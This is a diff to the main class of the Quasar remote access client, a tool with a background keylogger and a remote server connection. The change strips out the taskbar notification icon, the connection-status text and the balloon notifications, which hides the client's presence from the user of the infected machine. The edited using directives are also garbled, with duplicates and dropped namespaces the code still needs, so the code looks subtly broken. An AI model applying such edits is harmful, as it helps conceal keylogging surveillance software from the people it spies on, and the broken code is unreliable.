@@ -1,18 +1,13 @@
-﻿using Quasar.Client.Config;
-using Quasar.Client.Logging;
+﻿using Quasar.Client.Logging;
 using Quasar.Client.Messages;
-using Quasar.Client.Networking;
+using Quasar.Client;
 using Quasar.Client.Setup;
-using Quasar.Client.User;
+using Quasar.Client;
 using Quasar.Client.Utilities;
-using Quasar.Common.DNS;
-using Quasar.Common.Helpers;
-using Quasar.Common.Messages;
+using Quasar.Common;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
-using System.Drawing;
-using System.Reflection;
 using System.Threading;
 using System.Windows.Forms;
 
@@ -37,7 +32,7 @@ namespace Quasar.Client
         /// List of <see cref="IMessageProcessor"/> to keep track of all used message processors.
         /// </summary>
         private readonly List<IMessageProcessor> _messageProcessors;
-        
+
         /// <summary>
         /// The background keylogger service used to capture and store keystrokes.
         /// </summary>
@@ -54,17 +49,11 @@ namespace Quasar.Client
         private bool IsInstallationRequired => Settings.INSTALL && Settings.INSTALLPATH != Application.ExecutablePath;
 
         /// <summary>
-        /// Notification icon used to show notifications in the taskbar.
-        /// </summary>
-        private readonly NotifyIcon _notifyIcon;
-
-        /// <summary>
         /// Initializes a new instance of the <see cref="QuasarApplication"/> class.
         /// </summary>
         public QuasarApplication()
         {
             _messageProcessors = new List<IMessageProcessor>();
-            _notifyIcon = new NotifyIcon();
             Run();
         }
 
@@ -133,7 +122,6 @@ namespace Quasar.Client
 
                 var hosts = new HostsManager(new HostsConverter().RawHostsToList(Settings.HOSTS));
                 _connectClient = new QuasarClient(hosts, Settings.SERVERCERTIFICATE);
-                _connectClient.ClientState += ConnectClientOnClientState;
                 InitializeMessageProcessors(_connectClient);
 
                 _userActivityDetection = new ActivityDetection(_connectClient);
@@ -147,14 +135,6 @@ namespace Quasar.Client
                     Environment.Exit(0);
                 }).Start();
             }
-        }
-
-        private void ConnectClientOnClientState(Networking.Client s, bool connected)
-        {
-            if (connected)
-                _notifyIcon.Text = "Quasar Client\nConnection established";
-            else
-                _notifyIcon.Text = "Quasar Client\nNo connection";
         }
 
         /// <summary>
@@ -183,8 +163,6 @@ namespace Quasar.Client
             foreach (var msgProc in _messageProcessors)
             {
                 MessageHandler.Register(msgProc);
-                if (msgProc is NotificationMessageProcessor notifyMsgProc)
-                    notifyMsgProc.ProgressChanged += ShowNotification;
             }
         }
 
@@ -196,20 +174,11 @@ namespace Quasar.Client
             foreach (var msgProc in _messageProcessors)
             {
                 MessageHandler.Unregister(msgProc);
-                if (msgProc is NotificationMessageProcessor notifyMsgProc)
-                    notifyMsgProc.ProgressChanged -= ShowNotification;
                 if (msgProc is IDisposable disposableMsgProc)
                     disposableMsgProc.Dispose();
             }
         }
 
-        private void ShowNotification(object sender, string value)
-        {
-            if (Settings.UNATTENDEDMODE)
-                return;
-            
-            _notifyIcon.ShowBalloonTip(4000, "Quasar Client", value, ToolTipIcon.Info);
-        }
 
         protected override void Dispose(bool disposing)
         {
@@ -220,8 +189,6 @@ namespace Quasar.Client
                 _userActivityDetection?.Dispose();
                 ApplicationMutex?.Dispose();
                 _connectClient?.Dispose();
-                _notifyIcon.Visible = false;
-                _notifyIcon.Dispose();
             }
             base.Dispose(disposing);
         }
